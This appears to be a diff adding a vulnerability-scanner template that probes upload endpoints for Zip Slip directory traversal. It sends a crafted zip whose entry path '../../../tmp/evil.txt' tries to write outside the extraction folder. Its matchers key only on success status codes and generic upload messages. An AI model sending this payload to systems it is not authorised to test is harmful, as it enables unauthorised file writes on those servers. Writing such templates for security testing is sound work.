@@ -1,0 +1,58 @@
+id: medium-upload-zip-slip-directory-traversal
+
+info:
+  name: Zip Slip Directory Traversal - Elite Detection
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects zip slip vulnerabilities in file upload functionality where malicious zip files
+    can write files outside the intended directory using path traversal techniques.
+  reference:
+    - https://snyk.io/research/zip-slip-vulnerability
+    - https://cwe.mitre.org/data/definitions/22.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-22
+  tags: upload,zip-slip,directory-traversal,path-traversal
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/upload.php"
+      - "{{BaseURL}}/fileupload"
+
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="file"; filename="malicious.zip"
+      Content-Type: application/zip
+
+      PK{{hex_decode("030414000000080000000000000000000000000000000000")}}../../../tmp/evil.txt{{hex_decode("504b010214000000080000000000000000000000000000000000")}}
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        condition: or
+        words:
+          - "upload successful"
+          - "extracted successfully"
+          - "zip processed"
+          - "files extracted"
+
+    extractors:
+      - type: regex
+        name: extracted-files
+        part: body
+        regex:
+          - "(?i)(extracted|saved|created).*\\.\\./.*"
